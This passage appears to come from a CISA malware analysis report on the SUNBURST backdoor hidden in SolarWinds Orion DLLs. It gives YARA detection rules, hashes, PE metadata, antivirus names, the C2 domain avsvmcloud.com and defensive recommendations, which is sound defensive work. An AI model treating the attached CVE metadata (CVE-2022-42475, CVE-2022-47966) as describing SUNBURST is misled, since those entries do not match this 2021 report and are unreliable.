\u00a0\u00a0\u00a0$ak = \"88wrSS1KS0xOLQYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$al = \"c87PLcjPS80rKQYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$am = \"Ky7PLNAvLUjRBwA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$an = \"06vIzQEA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$b = \"0y3NyyxLLSpOzIlPTgQA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$c = \"001OBAA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$d = \"0y0oysxNLKqMT04EAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$e = \"0y3JzE0tLknMLQAA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$f = \"003PyU9KzAEA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$h = \"0y1OTS4tSk1OBAA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$i = \"K8jO1E8uytGvNqitNqytNqrVA/IA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$j = \"c8rPSQEA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$k = \"c8rPSfEsSczJTAYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$l = \"c60oKUp0ys9JAQA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$m = \"c60oKUp0ys9J8SxJzMlMBgA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$n = \"8yxJzMlMBgA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$o = \"88lMzygBAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$p = \"88lMzyjxLEnMyUwGAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$q = \"C0pNL81JLAIA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$r = \"C07NzXTKz0kBAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s = \"C07NzXTKz0nxLEnMyUwGAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t = \"yy9IzStOzCsGAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$u = \"y8svyQcA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$v = \"SytKTU3LzysBAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$w = \"C84vLUpOdc5PSQ0oygcA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$x = \"C84vLUpODU4tykwLKMoHAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$y = \"C84vLUpO9UjMC07MKwYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$z = \"C84vLUpO9UjMC04tykwDAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($a and $b and $c and $d and $e and $f and $h and $i) or ($j and $k and $l and $m and $n and $o and $p and $q and $r and $s and ($aa or $ab)) or ($t and $u and $v and $w and $x and $y and $z and ($aa or $ab)) or ($ac and $ad and $ae and $af and $ag and $ah and ($am or $an)) or ($ai and $aj and $ak and $al and ($am or $an))\n\t\t\t\t}\n\nssdeep Matches\n\n\n\n94\n019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134\n\n\n\nPE Metadata\n\n\n\nCompile Date\n2020-05-11 17:32:40-04:00\n\n\nImport Hash\ndae02f32a21e03ce65412f6e56942daa\n\n\nCompany Name\nSolarWinds Worldwide, LLC.\n\n\nFile Description\nSolarWinds.Orion.Core.BusinessLayer\n\n\nInternal Name\nSolarWinds.Orion.Core.BusinessLayer.dll\n\n\nLegal Copyright\nCopyright \u00a9 1999-2020 SolarWinds Worldwide, LLC. All Rights Reserved.\n\n\nOriginal Filename\nSolarWinds.Orion.Core.BusinessLayer.dll\n\n\nProduct Name\nSolarWinds.Orion.Core.BusinessLayer\n\n\nProduct Version\n2020.2.5300.12432\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n87b3389568887539d8c12033e01bcbda\nheader\n512\n2.901277\n\n\n58ca620058a1e26cda220dcb83f4eb26\n.text\n1018368\n5.567638\n\n\n1d816f4a16b05559313aa30a0d3532d6\n.rsrc\n1536\n3.008439\n\n\n0db83a842dbb0bb3396691d4238bd216\n.reloc\n512\n0.101910\n\n\n\nDescription\nThis file has been identified as a SolarWinds Application module containing a patched in SUNBURST backdoor. This embedded SUNBURST code contains the same functions as \"SolarWinds.Orion.Core.BusinessLayer.dll\" (32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77), and is signed with the same digital certificate.\n\n\n019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134\nTags\nbackdoortrojan\nDetails\n\n\n\nName\nSolarWinds.Orion.Core.BusinessLayer.dll\n\n\nSize\n1028072 bytes\n\n\nType\nPE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n\nMD5\n2c4a910a1299cdae2a4e55988a2f102e\n\n\nSHA1\n2f1a5a7411d015d01aaee4535835400191645023\n\n\nSHA256\n019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134\n\n\nSHA512\n5cbfefe612a40c8872a0faf3db8d3835dc514fb3df159610095b47c595c6caa1ada79cce2b10fb99e648990c3f54f63344d1fa7025090bfcd4e2c55d7210a28d\n\n\nssdeep\n12288:dJKoHwfn/jz3bbO4Qag2I97PMieSLezPKT+cYvjenWHuhh9c0g8vkzE19Wv:rEfDbO97P8TrKhYbenWH4c0g8vkzE19e\n\n\nEntropy\n5.579997\n\n\n\nAntivirus\n\n\n\nAhnlab\nBackdoor/Win32.SunBurst\n\n\nAntiy\nTrojan[Backdoor]/MSIL.Agent\n\n\nAvira\nTR/Sunburst.AH\n\n\nBitDefender\nTrojan.Sunburst.A\n\n\nClamav\nWin.Countermeasure.Sunburst-9809152-0\n\n\nComodo\nBackdoor\n\n\nCyren\nW32/Trojan.QTKK-7476\n\n\nESET\na variant of MSIL/SunBurst.A trojan\n\n\nEmsisoft\nTrojan.Win32.Sunburst (A)\n\n\nIkarus\nBackdoor.Sunburst\n\n\nK7\nTrojan ( 00574a531 )\n\n\nLavasoft\nTrojan.Sunburst.A\n\n\nMcAfee\nTrojan-sunburst\n\n\nMicrosoft Security Essentials\nTrojan:MSIL/Solorigate.BR!dha\n\n\nNANOAV\nTrojan.Win32.SunBurst.iduxfm\n\n\nNetGate\nTrojan.Win32.Malware\n\n\nSophos\nMal/Sunburst-A\n\n\nSymantec\nBackdoor.Sunburst\n\n\nSystweak\ntrojan-backdoor.sunburst-r\n\n\nTrendMicro\nBackdoo.6F8C6A1E\n\n\nTrendMicro House Call\nBackdoo.6F8C6A1E\n\n\nVirusBlokAda\nTScope.Trojan.MSIL\n\n\nZillya!\nTrojan.SunBurst.Win32.1\n\n\n\nYARA Rules\n\nrule CISA_10318927_01 : trojan rat SOLAR_FIRE\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"CISA Code & Media Analysis\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Incident = \"10318927\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2020-12-13\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modified = \"20201213_2145\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"TROJAN RAT\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"SOLAR_FIRE\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"This signature is based off of unique strings embedded within the modified Solar Winds app\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"b91ce2fa41029f6955bff20079468448\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_2 = \"846e27a652a5e1bfbd0ddd38a16dc865\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_2 = \"ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s0 = { 63 00 30 00 6B 00 74 00 54 00 69 00 37 00 4B 00 4C 00 43 00 6A 00 4A 00 7A 00 4D 00 38 00 44 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s1 = { 41 00 41 00 3D 00 3D 00 00 21 38 00 33 00 56 00 30 00 64 00 6B 00 78 00 4A 00 4B 00 55 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s2 = { 63 00 2F 00 46 00 77 00 44 00 6E 00 44 00 4E 00 53 00 30 00 7A 00 4B 00 53 00 55 00 30 00 42 00 41 00 41 00 3D 00 3D }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s3 = { 53 00 69 00 30 00 75 00 42 00 67 00 41 00 3D 00 00 21 38 00 77 00 77 00 49 00 4C 00 6B 00 33 00 4B 00 53 00 79 00 30 00 42 }\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\tall of them\n\t\t\t\t}\nrule FireEye_20_00025668_01 : SUNBURST APT backdoor\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"FireEye\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2020-12-13\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modified = \"20201213_1917\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"Backdoor\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"SUNBURST\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"This rule is looking for portions of the SUNBURST backdoor that are vital to how it functions. The first signature fnv_xor matches a magic byte xor that the sample performs on process, service, and driver names/paths. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services.\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$cmd_regex_encoded = \"U4qpjjbQtUzUTdONrTY2q42pVapRgooABYxQuIZmtUoA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$cmd_regex_plain = { 5C 7B 5B 30 2D 39 61 2D 66 2D 5D 7B 33 36 7D 5C 7D 22 7C 22 5B 30 2D 39 61 2D 66 5D 7B 33 32 7D 22 7C 22 5B 30 2D 39 61 2D 66 5D 7B 31 36 7D }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_event_encoded = \"U3ItS80rCaksSFWyUvIvyszPU9IBAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_event_plain = { 22 45 76 65 6E 74 54 79 70 65 22 3A 22 4F 72 69 6F 6E 22 2C }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_eventmanager_encoded = \"U3ItS80r8UvMTVWyUgKzfRPzEtNTi5R0AA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_eventmanager_plain = { 22 45 76 65 6E 74 4E 61 6D 65 22 3A 22 45 76 65 6E 74 4D 61 6E 61 67 65 72 22 2C }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_message_encoded = \"U/JNLS5OTE9VslKqNqhVAgA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_message_plain = { 22 4D 65 73 73 61 67 65 22 3A 22 7B 30 7D 22 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fnv_xor = { 67 19 D8 A7 3B 90 AC 5B }\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fnv_xor and ($cmd_regex_encoded or $cmd_regex_plain) or ( ($fake_orion_event_encoded or $fake_orion_event_plain) and ($fake_orion_eventmanager_encoded or $fake_orion_eventmanager_plain) and ($fake_orion_message_encoded and $fake_orion_message_plain) )\n\t\t\t\t}\nrule FireEye_20_00025668_02 : SUNBURST APT backdoor\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"FireEye\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2020-12-13\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modified = \"20201213_1917\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"Backdoor\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"SUNBURST\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"The SUNBURST backdoor uses a domain generation algorithm (DGA) as part of C2 communications. This rule is looking for each branch of the code that checks for which HTTP method is being used. This is in one large conjunction, and all branches are then tied together via disjunction. The grouping is intentionally designed so that if any part of the DGA is re-used in another sample, this signature should match that re-used portion. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services.\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$a = \"0y3Kzy8BAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$aa = \"S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ab = \"S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ac = \"C88sSs1JLS4GAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ad = \"C/UEAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ae = \"C89MSU8tKQYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$af = \"8wvwBQA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ag = \"cyzIz8nJBwA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ah = \"c87JL03xzc/LLMkvysxLBwA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ai = \"88tPSS0GAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$aj = \"C8vPKc1NLQYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ak = \"88wrSS1KS0xOLQYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$al = \"c87PLcjPS80rKQYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$am = \"Ky7PLNAvLUjRBwA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$an = \"06vIzQEA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$b = \"0y3NyyxLLSpOzIlPTgQA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$c = \"001OBAA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$d = \"0y0oysxNLKqMT04EAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$e = \"0y3JzE0tLknMLQAA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$f = \"003PyU9KzAEA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$h = \"0y1OTS4tSk1OBAA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$i = \"K8jO1E8uytGvNqitNqytNqrVA/IA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$j = \"c8rPSQEA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$k = \"c8rPSfEsSczJTAYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$l = \"c60oKUp0ys9JAQA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$m = \"c60oKUp0ys9J8SxJzMlMBgA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$n = \"8yxJzMlMBgA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$o = \"88lMzygBAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$p = \"88lMzyjxLEnMyUwGAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$q = \"C0pNL81JLAIA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$r = \"C07NzXTKz0kBAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s = \"C07NzXTKz0nxLEnMyUwGAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t = \"yy9IzStOzCsGAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$u = \"y8svyQcA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$v = \"SytKTU3LzysBAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$w = \"C84vLUpOdc5PSQ0oygcA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$x = \"C84vLUpODU4tykwLKMoHAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$y = \"C84vLUpO9UjMC07MKwYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$z = \"C84vLUpO9UjMC04tykwDAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($a and $b and $c and $d and $e and $f and $h and $i) or ($j and $k and $l and $m and $n and $o and $p and $q and $r and $s and ($aa or $ab)) or ($t and $u and $v and $w and $x and $y and $z and ($aa or $ab)) or ($ac and $ad and $ae and $af and $ag and $ah and ($am or $an)) or ($ai and $aj and $ak and $al and ($am or $an))\n\t\t\t\t}\n\nssdeep Matches\n\n\n\n94\nce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6\n\n\n\nPE Metadata\n\n\n\nCompile Date\n2020-04-21 10:53:33-04:00\n\n\nImport Hash\ndae02f32a21e03ce65412f6e56942daa\n\n\nCompany Name\nSolarWinds Worldwide, LLC.\n\n\nFile Description\nSolarWinds.Orion.Core.BusinessLayer\n\n\nInternal Name\nSolarWinds.Orion.Core.BusinessLayer.dll\n\n\nLegal Copyright\nCopyright \u00a9 1999-2020 SolarWinds Worldwide, LLC. All Rights Reserved.\n\n\nOriginal Filename\nSolarWinds.Orion.Core.BusinessLayer.dll\n\n\nProduct Name\nSolarWinds.Orion.Core.BusinessLayer\n\n\nProduct Version\n2020.2.5200.12394\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n7810cd48d16fb0d3c3a0c855f2d9225a\nheader\n512\n2.907043\n\n\nf249efb5d984eb62f325179a721985f3\n.text\n1018368\n5.567580\n\n\n9aea23ae0750b77218d9a85d4896eb0c\n.rsrc\n1536\n3.005835\n\n\n0db83a842dbb0bb3396691d4238bd216\n.reloc\n512\n0.101910\n\n\n\nDescription\nThis file has been identified as a SolarWinds Application module containing a patched in SUNBURST backdoor. This embedded SUNBURST code contains the same functions as \"SolarWinds.Orion.Core.BusinessLayer.dll\" (32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77), and is signed with the same digital certificate.\n\nRelationship Summary\n\n\n\n\n32519b85c0...\nConnected_To\navsvmcloud.com\n\n\n32519b85c0...\nContained_Within\nd0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600\n\n\navsvmcloud.com\nConnected_From\n32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\n\n\nd0d626deb3...\nContains\n32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\n\n\n\n\nConclusion\n\nPlease refer to the following resources for additional information and mitigation actions related to this campaign:\n\n\t\t\t1) Alert (AA20-352A): Advanced Persistent Threat Compromise of Government Agencies, Critical Infrastructure, and Private Sector Organizations\n\t\t\thttps://us-cert.cisa.gov/ncas/alerts/aa20-352a\n\n\t\t\t2) Emergency Directive 21-01: Mitigate SolarWinds Orion Code Compromise\n\t\t\thttps://cyber.dhs.gov/ed/21-01/\n\nRecommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file header).\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, \"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".\n\nContact Information\n\n\n1-888-282-0870\nCISA Central\u00a0(UNCLASS)\nCISA SIPR (SIPRNET)\nCISA IC (JWICS)\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this product at the following URL: https://www.surveymonkey.com/r/G8STDRY\n\nDocument FAQ\n\nWhat is a MIFR? A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely manner. In most instances this report will provide initial indicators for computer and network defense. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nWhat is a MAR? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via manual reverse engineering. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nCan I edit this document? This document is not to be edited in any way by recipients. All comments or questions related to this document should be directed to the CISA at 1-888-282-0870 or CISA Central.\nCan I submit malware to CISA? Malware samples can be submitted via three methods:\n\nWeb: https://malware.us-cert.gov\nE-Mail: submit@malware.us-cert.gov\nFTP: ftp.malware.us-cert.gov (anonymous)\n\nCISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and phishing-related scams. Reporting forms can be found on CISA's homepage at www.cisa.gov.\n\n\n\n\n\n\n\n\nRevisions\n\nFebruary 8, 2021: Initial Version|April 15, 2021: Updated with Attribution Statement\n",
  "cves": [
    "CVE-2022-42475",
    "CVE-2022-47966"
  ],
  "techniques": [],
  "advisory": "ar21-039a",
  "title": "MAR-10318845-1.v1 - SUNBURST | CISA",
  "source": "analysis-reports",
  "id": "cbcd81388dd7369cb355caf05a278fd29ba21f20ed6fe351f85c07abd19a0cbf"
}